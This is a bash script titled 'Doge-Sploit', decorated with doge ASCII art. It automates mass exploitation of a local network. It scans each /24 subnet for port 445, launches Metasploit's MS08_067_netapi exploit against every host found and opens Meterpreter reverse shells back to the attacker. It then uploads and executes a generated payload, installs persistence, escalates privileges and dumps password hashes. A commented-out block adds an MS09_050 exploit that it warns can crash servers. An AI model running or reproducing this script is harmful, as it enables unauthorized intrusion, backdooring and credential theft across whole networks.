#An automated script to detect any
#potentially vulnerable machines within your LAN
#and automatically attempt exploit
#MS08_067_netapi against all hosts with
#port 445 open. Enjoy!

echo " 
Doge-Sploit
░░░░░░░░░▄░░░░░░░░░░░░░░▄░░░░ So Exploits
░░░░░░░░▌▒█░░░░░░░░░░░▄▀▒▌░░░
░░░░░░░░▌▒▒█░░░░░░░░▄▀▒▒▒▐░░░ Much Shells
░░░░░░░▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐░░░
░░░░░▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐░░░
░░░▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌░░░
░░▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌░░
░░▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐░░
░▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌░
░▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌░
▀▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐░ Wow!
▐▒▒▐▀▐▀▒░▄▄▒▄▒▒▒▒▒▒░▒░▒░▒▒▒▒▌
▐▒▒▒▀▀▄▄▒▒▒▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▐░
░▌▒▒▒▒▒▒▀▀▀▒▒▒▒▒▒░▒░▒░▒░▒▒▒▌░
░▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▄▒▒▐░░
░░▀▄▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▄▒▒▒▒▌░░
░░░░▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀░░░
░░░░░░▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀░░░░░
░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▀▀░░░░░░░░
"
echo "Begin?"
read asdfasdf

echo "Initiating scan of the network"
x=4500
y=5500
for network in $(ifconfig |grep "inet addr:" |grep -v 127.0.0.1 |cut -d: -f2 |cut -d" " -f1 |cut -d. -f1-3 ); do
for attacker in $( ifconfig |grep "inet addr:" |cut -d: -f2 |grep -v 127.0.0.1 |cut -d" " -f1 ); do

echo " ">handler.rc
echo "use exploit/multi/handler">>handler.rc
echo "set payload windows/meterpreter/reverse_https">>handler.rc
echo "set LHOST $attacker ">>handler.rc
echo "set LPORT 443 ">>handler.rc
echo "set ExitOnSession false">>handler.rc
echo "exploit -j">>handler.rc
echo "Starting Session Handler"
xterm -e msfconsole -r handler.rc &
echo "Generating custom Payload"
msfpayload windows/meterpreter/reverse_https LHOST=$attacker LPORT=443 x >wsock32.exe

echo "Scanning the current Class-C Network"
echo "$network.0/24"
nmap -v $network.0/24 -p445 |grep Discovered |cut -d" " -f6 >$network.txt
echo " ">persist.rc
echo "run persistence -A -S -U -i 60 -r $attacker ">>persist.rc
echo "upload wsock32.exe ">>persist.rc
echo "execute -f wsock32.exe -c ">>persist.rc
echo "getsystem -t 1">>persist.rc
echo "hashdump">>persist.rc

for victim in $( cat $network.txt ); do
echo "Victims found, Attempting MS08_067 Attack (Server 2003/XP)"
xterm -e msfcli exploit/windows/smb/ms08_067_netapi RHOST=$victim PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attacker LPORT=$x AutoRunScript"=multi_console_command -rc persist.rc" E &
((x++))

# Uncomment Lines 68 & 69 to enable automated exploits for MS09_050
#Be Warned! MS09_050 is unstable and can/will crash your target servers!

#echo "Attempting MS09_050 Attack (Server 2008 x86)"
#msfcli exploit/windows/smb/ms09_050_smb2_negotiate_func_index RHOST=$victim PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$attacker LPORT=$y AutoRunScript"=multi_console_command -rc persist.rc" E &
done
done
done
echo "Much Exploits"
echo "WOW"
